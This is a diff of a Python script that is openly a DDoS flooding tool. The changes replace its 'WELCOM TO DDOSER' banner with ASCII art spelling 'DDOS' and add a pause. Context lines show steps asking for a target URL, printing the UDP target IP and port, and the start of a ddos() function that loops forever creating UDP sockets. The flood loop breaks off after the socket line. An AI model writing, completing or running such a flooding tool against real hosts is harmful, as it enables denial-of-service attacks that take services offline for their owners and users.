@@ -67,8 +67,18 @@ if update == ('n') or update == ('N'):
 
 os.system('cls' or 'clear')
 print('')
-print(color.sabz+'''       \tW E L C O M   T O   D D O S E R     ''')
+print("############################################################################")
+print("#      @#%$             @#%$             $#^%            ^%&*              #") 
+print("#      $#  %$           $#  %$        ^%     ^%        *#                  #")
+print("#      %$   %$          %$   %$       %$     !@        ^%                  #")
+print("#      %$    %$         %$    %$      &^     ^%        $%                  #")
+print("#      ^%    @#         ^%    @#      %$     ^%         ^%                 #")
+print("#      $3   $%          $3   $%       @#     &^            &^              #")
+print("#      %$  $%           &$  $%        #^    ^%              &%             #")
+print("#      %$%$             %$%$            $#^%            #$$&               #")
+print("############################################################################")
 print('')
+time.sleep(2)
 print(color.sefid+'------------------------------------------------------------')
 print('')
 print(color.narenji+'    Step 1.  Enter url')
@@ -97,6 +107,7 @@ print(color.sefid+'------------------------------------------------------------'
 print(color.sabz+"UDP target IP:", ip)
 print(color.sabz+"UDP target port:", UDP_PORT)
 time.sleep(5)
+
 def ddos(i):
     while 1:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
